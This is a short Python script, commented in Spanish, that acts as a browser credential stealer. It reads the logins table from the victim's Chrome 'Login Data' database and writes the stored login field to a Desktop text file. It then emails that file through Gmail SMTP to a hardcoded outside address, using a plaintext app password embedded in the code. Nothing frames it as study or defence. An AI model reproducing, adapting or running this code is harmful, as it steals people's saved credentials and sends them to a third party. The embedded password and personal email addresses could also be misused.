import os
import re
import sqlite3
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from random import randint
from shutil import copyfile
from time import sleep
from smtplib import SMTP
from email import encoders

def create_file(desktop_path):
    o = open(desktop_path + "Cuentas.txt", "w")
    return o


def accounts():
    ulrs = None
    while not ulrs:  #mientras no haya nada intenta
        #Esto se va a intentar hasta que ulrs no sea nada
        #Entonces mostrará la excepción
        #Cuando ulrs ya sea algo dejará de intentar, el try se ejecuta y la exception ya no salta.
        try:
            history_chrome = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            conn = sqlite3.connect(history_chrome)
            statement = conn.cursor()
            statement.execute("SELECT * FROM logins")
            urls = statement.fetchall()
            return urls
        except sqlite3.OperationalError:
            print("esperando")


def consults(account, file):
    for i in account:
        file.write(i[3]+"\n")


def mails(file, nombre_adjunto, asunto):
    mensaje = MIMEMultipart()
    mensaje["From"] = "falcorjg@gmail.com"
    mensaje["To"] = "jesus.machaca@tecsup.edu.pe"
    mensaje["Subject"] = asunto
    mensaje.attach(MIMEText("", "plain"))
    adjunto = MIMEBase("application", "octet-stream")
    adjunto.set_payload(open(file, "rb").read())
    adjunto.add_header("content-Disposition", f'attachment; filename="{nombre_adjunto}.txt"')
    encoders.encode_base64(adjunto)
    mensaje.attach(adjunto)
    smtp = SMTP("smtp.gmail.com")
    smtp.starttls()
    smtp.login("falcorjg@gmail.com", "xppikjbzdavplepw")
    smtp.sendmail("falcorjg@gmail.com", "jesus.machaca@tecsup.edu.pe", mensaje.as_string())
    smtp.quit()

def main():
    path = f"C:\\Users\\{os.getlogin()}\\Desktop\\"
    file = create_file(path)
    account = accounts()
    consults(account, file)
    file_c = path + "Cuentas.txt"
    file.close()
    mails(file_c, "Cuentas", "Importante")


if __name__ == "__main__":
    main()